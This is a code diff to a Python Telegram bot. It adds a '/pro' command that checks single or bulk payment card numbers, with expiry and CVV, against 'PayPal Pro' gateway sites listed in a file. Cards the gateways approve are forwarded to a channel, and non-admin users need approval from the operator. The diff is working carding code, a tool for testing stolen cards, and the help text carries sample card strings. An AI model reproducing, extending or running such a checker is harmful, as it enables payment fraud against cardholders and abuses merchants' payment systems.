@@ -1161,6 +1161,7 @@ Commands:
 /b3 <card> - Check a single card (Braintree Auth)
 /b3s <cards> - Check multiple cards (Braintree Auth)
 /pp <card/cards> - Check single or multiple cards (PPCP Gateway)
+/pro <card/cards> - Check single or multiple cards (PayPal Pro Gateway)
 """
     
     if is_admin:
@@ -1175,6 +1176,7 @@ Commands:
 Single Card Examples:
 /b3 5156123456789876|11|29|384
 /pp 4315037547717888|10|28|852
+/pro 4315037547717888|10|28|852
 
 Mass Check Examples:
 /b3s 5401683112957490|10|2029|741
@@ -1182,6 +1184,9 @@ Mass Check Examples:
 4284303806640816 0628 116
 
 /pp 5401683112957490|10|2029|741
+4386680119536105|01|2029|147
+
+/pro 5401683112957490|10|2029|741
 4386680119536105|01|2029|147
 4000223361770415|04|2029|639
 
@@ -1626,6 +1631,191 @@ async def pp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await status_msg.delete()
         except:
             pass
+
+
+async def pro_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /pro command for PayPal Pro gateway checking with rate limiting and mass checking support"""
+    user_id = update.effective_user.id
+    is_admin = user_id == ADMIN_ID
+
+    # Check if user is admin or approved
+    if not is_admin and not is_user_approved(user_id):
+        await update.message.reply_text(
+            "❌ You don't have access to use this bot.\n"
+            f"Your User ID: `{user_id}`\n\n"
+            "Please contact @TUMAOB for approval.",
+            parse_mode='Markdown'
+        )
+        return
+
+    # Check if card details are provided
+    if not context.args:
+        await update.message.reply_text(
+            "❌ Please provide card details.\n\n"
+            "Single Card Format: /pro number|mm|yy|cvv\n"
+            "Mass Check Format:\n/pro 5401683112957490|10|2029|741\n4386680119536105|01|2029|147\n4000223361770415|04|2029|639"
+        )
+        return
+
+    # Parse cards from message (support multiline input)
+    message_text = update.message.text
+    # Remove the /pro command
+    cards_text = message_text.replace('/pro', '', 1).strip()
+
+    # Split by newlines to get individual cards
+    card_lines = [line.strip() for line in cards_text.split('\n') if line.strip()]
+
+    if not card_lines:
+        await update.message.reply_text(
+            "❌ No valid cards found.\n\n"
+            "Format:\n"
+            "Single: /pro number|mm|yy|cvv\n"
+            "Mass: /pro 5401683112957490|10|2029|741\n4386680119536105|01|2029|147"
+        )
+        return
+
+    # Import PayPal Pro module
+    try:
+        from paypalpro import paypalpro
+    except ImportError:
+        sys.path.append(os.path.join(os.path.dirname(__file__), 'paypalpro'))
+        from paypalpro import paypalpro
+
+    # Normalize all cards
+    normalized_cards = []
+    for card_line in card_lines:
+        normalized = paypalpro.normalize_card_format(card_line)
+        if normalized:
+            normalized_cards.append(normalized)
+        else:
+            await update.message.reply_text(
+                f"❌ Invalid card format: {card_line}\n\n"
+                "Supported formats:\n"
+                "- number|mm|yy|cvv\n"
+                "- number mmyy cvv"
+            )
+            return
+
+    total_cards = len(normalized_cards)
+
+    # Load sites from paypalpro/sites.txt
+    sites = paypalpro.load_sites()
+    if not sites:
+        await update.message.reply_text("❌ No PayPal Pro sites configured! Please add sites to paypalpro/sites.txt")
+        return
+
+    # Handle single card vs mass checking
+    if total_cards == 1:
+        # Single card - apply rate limiting for non-admin users
+        if not is_admin:
+            with user_rate_limit_lock:
+                current_time = time.time()
+                last_check_time = user_rate_limit.get(user_id, 0)
+                time_since_last_check = current_time - last_check_time
+
+                if time_since_last_check < RATE_LIMIT_SECONDS:
+                    wait_time = RATE_LIMIT_SECONDS - time_since_last_check
+                    await update.message.reply_text(
+                        f"⏳ Please wait {wait_time:.1f} seconds before checking another card.\n"
+                        "This prevents overloading the system."
+                    )
+                    return
+
+                # Update last check time
+                user_rate_limit[user_id] = current_time
+
+        # Send "Checking Please Wait" message
+        checking_msg = await update.message.reply_text("⏳ Checking Please Wait... (PayPal Pro)")
+
+        try:
+            # Check the single card using PayPal Pro gateway
+            result = paypalpro.check_card(normalized_cards[0], sites=sites)
+            formatted_result = paypalpro.format_result(result)
+
+            # Edit the message with the result
+            await checking_msg.edit_text(formatted_result)
+
+            # Forward to channel if approved
+            if result.get('approved', False):
+                await forward_to_channel(context, normalized_cards[0], formatted_result, gateway='pp')
+
+        except Exception as e:
+            error_message = f"❌ Error checking card: {str(e)}"
+            await checking_msg.edit_text(error_message)
+            print(f"Error in /pro command: {str(e)}")
+
+    else:
+        # Mass checking
+        # Send initial status message
+        status_msg = await update.message.reply_text(
+            f"⏳ Checking {total_cards} card(s) via PayPal Pro...\n"
+            f"Progress: 0/{total_cards}"
+        )
+
+        # Track progress
+        approved_count = 0
+        declined_count = 0
+
+        for idx, card in enumerate(normalized_cards, 1):
+            # Rate limiting for non-admin users (between cards in mass check)
+            if not is_admin and idx > 1:
+                with user_rate_limit_lock:
+                    current_time = time.time()
+                    last_check_time = user_rate_limit.get(user_id, 0)
+                    time_since_last_check = current_time - last_check_time
+
+                    if time_since_last_check < RATE_LIMIT_SECONDS:
+                        wait_time = RATE_LIMIT_SECONDS - time_since_last_check
+                        await asyncio.sleep(wait_time)
+
+                    # Update last check time
+                    user_rate_limit[user_id] = time.time()
+
+            try:
+                # Check the card
+                result = paypalpro.check_card(card, sites=sites)
+                formatted_result = paypalpro.format_result(result)
+
+                # Count approved/declined
+                if result.get('approved', False):
+                    approved_count += 1
+                    # Forward to channel if approved
+                    await forward_to_channel(context, card, formatted_result, gateway='pp')
+                else:
+                    declined_count += 1
+
+                # Send result immediately after checking
+                card_result = f"Card {idx}/{total_cards}:\n{formatted_result}"
+                await update.message.reply_text(card_result)
+
+            except Exception as e:
+                declined_count += 1
+                await update.message.reply_text(f"Card {idx}/{total_cards}:\n❌ Error: {str(e)}")
+
+            # Update progress
+            try:
+                await status_msg.edit_text(
+                    f"⏳ Checking {total_cards} card(s) via PayPal Pro...\n"
+                    f"Progress: {idx}/{total_cards}\n"
+                    f"✅ Approved: {approved_count} | ❌ Declined: {declined_count}"
+                )
+            except:
+                pass  # Ignore edit errors
+
+        # Send final summary
+        summary = f"📊 PayPal Pro Mass Check Complete\n\n"
+        summary += f"Total Cards: {total_cards}\n"
+        summary += f"✅ Approved: {approved_count}\n"
+        summary += f"❌ Declined: {declined_count}"
+
+        await update.message.reply_text(summary)
+
+        # Delete the progress message
+        try:
+            await status_msg.delete()
+        except:
+            pass
+
 
 async def admin_menu_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /admin command - show admin menu"""
@@ -3604,6 +3794,7 @@ def main():
     application.add_handler(CommandHandler("b3", b3_command))
     application.add_handler(CommandHandler("b3s", b3s_command))
     application.add_handler(CommandHandler("pp", pp_command))
+    application.add_handler(CommandHandler("pro", pro_command))
     application.add_handler(CommandHandler("approve", approve_command))
     application.add_handler(CommandHandler("admin", admin_menu_command))
     application.add_handler(CommandHandler("remove", remove_user_command))
